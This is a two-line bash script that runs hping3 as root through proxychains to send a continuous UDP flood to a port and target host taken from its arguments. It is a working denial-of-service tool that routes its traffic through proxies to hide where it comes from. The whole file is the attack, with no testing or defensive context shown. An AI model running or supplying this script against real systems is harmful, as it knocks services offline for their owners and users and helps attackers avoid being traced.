#!/bin/bash

sudo proxychains hping3 --flood --udp -p "$1" "$2"
